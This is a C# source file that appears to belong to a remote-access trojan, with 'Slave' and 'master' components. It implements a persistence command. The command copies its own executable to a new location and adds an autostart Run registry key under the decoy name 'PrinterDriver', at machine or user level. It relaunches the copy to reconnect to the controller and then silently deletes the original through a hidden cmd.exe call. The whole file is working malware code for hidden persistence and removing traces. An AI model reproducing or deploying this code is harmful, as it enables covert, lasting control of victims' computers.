using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using Shared;
using Slave.Core;

namespace Slave.Commands
{
    internal class Persistance : ICommand
    {
        public string name { get; } = "persistance";

        public void Process(List<string> args)
        {
            var path = Path.GetFullPath(args[0]);

            if (!CopyFileToDestination(path))
            {
                // File couldn't be copied, abort
                SlaveNetworkManager.GetInstance().WriteLine("KO");
                return;
            }
            // File copied at <path>
            SlaveNetworkManager.GetInstance().WriteLine(path);


            // Try to install the persistance at machine level, it required admin privileges
            if (SetPersistanceRegistryKey(path, true))
            {
                SlaveNetworkManager.GetInstance().WriteLine("OK");
            }
            else
            {
                SlaveNetworkManager.GetInstance().WriteLine("KO");
                // Couldn't write the key, setting it at current user level
                if (SetPersistanceRegistryKey(path, false))
                {
                    SlaveNetworkManager.GetInstance().WriteLine("OK");
                }
                else
                {
                    // Unsuccessfull operation
                    SlaveNetworkManager.GetInstance().WriteLine("KO");
                    try
                    {
                        // Remove copied executable
                        File.Delete(path);
                        return;
                    }
                    catch (Exception)
                    {
                        // Ignored
                    }
                }
            }
            
            var masterInfos = SlaveNetworkManager.GetInstance().GetMasterInfos();
            var newProcess = new Process()
            {
                StartInfo = new ProcessStartInfo(path, $"{masterInfos.Item1} {masterInfos.Item2 + 1}")
            };
            newProcess.Start();

            // Wait for confirmation from the master
            if (SlaveNetworkManager.GetInstance().ReadLine() == "connected")
            {
                var selfDestructProcess = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = "/C choice /C Y /N /D Y /T 4 & Del " + Application.ExecutablePath,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    }
                };
                selfDestructProcess.Start();

                // Exit to allow deletion
                throw new StopSlaveException();
            }
        }

        bool CopyFileToDestination(string path)
        {
            try
            {
                File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, path);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        bool SetPersistanceRegistryKey(string value, bool localMachine)
        {
            // "PrinterDriver" is a dummy name
            var valueName = "PrinterDriver";
            var keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            try
            {
                if (localMachine)
                {
                    Registry.LocalMachine.OpenSubKey(keyPath, true).SetValue(valueName, value);
                }
                else
                {
                    Registry.CurrentUser.OpenSubKey(keyPath, true).SetValue(valueName, value);
                }
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
